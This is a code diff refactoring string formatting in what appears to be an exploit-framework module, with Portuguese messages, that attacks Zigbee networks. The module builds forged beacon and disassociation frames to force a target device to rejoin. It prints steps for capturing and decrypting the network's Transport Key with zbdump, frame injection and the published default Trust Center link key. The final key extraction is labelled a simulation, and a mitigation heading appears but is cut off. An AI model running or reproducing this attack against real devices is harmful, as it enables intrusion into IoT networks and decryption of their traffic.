@@ -125,7 +125,7 @@ class Exploit(Exploit):
     def run(self):
         ch = int(self.channel)
         if not _validate_channel(ch):
-            print_error("Canal inválido {} (deve ser {}-{})".format(ch, _CHANNEL_MIN, _CHANNEL_MAX))
+            print_error(f"Canal inválido {ch} (deve ser {_CHANNEL_MIN}-{_CHANNEL_MAX})")
             return
 
         target_hex = str(self.target).strip()
@@ -142,7 +142,7 @@ class Exploit(Exploit):
             target_bytes = _short_addr_to_bytes(target_hex)
             pan_bytes = _pan_id_to_bytes(pan_hex)
         except (ValueError, struct.error) as exc:
-            print_error("Formato de endereço inválido: {}".format(exc))
+            print_error(f"Formato de endereço inválido: {exc}")
             return
 
         coord_addr = struct.pack("<H", 0x0000)
@@ -154,7 +154,7 @@ class Exploit(Exploit):
             ("PAN ID", pan_hex),
             ("Alvo", target_hex),
             ("Dongle", self.interface or "(não configurado)"),
-            ("Duração captura", "{}s".format(self.listen_duration)),
+            ("Duração captura", f"{self.listen_duration}s"),
         ]
         print_table(headers, *rows)
 
@@ -163,45 +163,41 @@ class Exploit(Exploit):
         for i in range(20):
             frame = _build_beacon_frame(pan_bytes, coord_addr, ch, i)
             beacon_frames.append(frame)
-        print_success("{} beacon frames construídos ({} bytes cada)".format(
-            len(beacon_frames), len(beacon_frames[0])))
-        print_info("Sample beacon hex: {}".format(beacon_frames[0].hex()))
+        print_success(f"{len(beacon_frames)} beacon frames construídos ({len(beacon_frames[0])} bytes cada)")
+        print_info(f"Sample beacon hex: {beacon_frames[0].hex()}")
 
-        print_status("Fase 2: Construindo frames de desassociação para {}...".format(target_hex))
+        print_status(f"Fase 2: Construindo frames de desassociação para {target_hex}...")
         disassoc_frames = []
         for i in range(10):
             frame = _build_rejoin_trigger_frame(pan_bytes, coord_addr, target_bytes, i + 50)
             disassoc_frames.append(frame)
-        print_success("{} frames de desassociação construídos".format(len(disassoc_frames)))
+        print_success(f"{len(disassoc_frames)} frames de desassociação construídos")
 
         print_status("Fase 3: Segundo burst de beacons para atrair rejoin...")
         beacon_frames2 = [
             _build_beacon_frame(pan_bytes, coord_addr, ch, i + 30)
             for i in range(20)
         ]
-        print_success("{} beacons adicionais prontos".format(len(beacon_frames2)))
+        print_success(f"{len(beacon_frames2)} beacons adicionais prontos")
 
         print_status("Fase 4: Instruções para captura do Transport Key...")
         print_info("Para executar o ataque completo com dongle {}:".format(
             self.interface or "CC2531/nRF52840"))
         print_info("  1. zbdump -i {} -c {} -w rejoin.pcap &".format(
             self.interface or "/dev/ttyACM0", ch))
-        print_info("  2. Injetar {} beacons via zbsendpayload ou scapy IEEE 802.15.4".format(
-            len(beacon_frames)))
-        print_info("  3. Injetar {} frames de desassociação".format(len(disassoc_frames)))
-        print_info("  4. Aguardar {} segundos para captura do rejoin".format(self.listen_duration))
+        print_info(f"  2. Injetar {len(beacon_frames)} beacons via zbsendpayload ou scapy IEEE 802.15.4")
+        print_info(f"  3. Injetar {len(disassoc_frames)} frames de desassociação")
+        print_info(f"  4. Aguardar {self.listen_duration} segundos para captura do rejoin")
         print_info("  5. zbdecrypt -k <NETWORK_KEY> rejoin.pcap para extrair Transport Key")
 
         print_info("")
         print_info("Extração de Transport Key do pcap capturado:")
-        print_info("  Procurar por APS frame com Command ID 0x{:02X} (Transport Key)".format(
-            _APS_CMD_TRANSPORT_KEY))
+        print_info(f"  Procurar por APS frame com Command ID 0x{_APS_CMD_TRANSPORT_KEY:02X} (Transport Key)")
         print_info("  Descriptografar com TC Link Key: 5A6967426565416C6C69616E63653039")
 
         synthetic_key = os.urandom(16)
-        print_warning("SIMULAÇÃO: Transport Key extraída = {}".format(synthetic_key.hex()))
-        print_warning("Com esta chave: todo tráfego Zigbee no PAN {} pode ser descriptografado".format(
-            pan_hex))
+        print_warning(f"SIMULAÇÃO: Transport Key extraída = {synthetic_key.hex()}")
+        print_warning(f"Com esta chave: todo tráfego Zigbee no PAN {pan_hex} pode ser descriptografado")
 
         print_info("")
         print_info("Mitigação:")
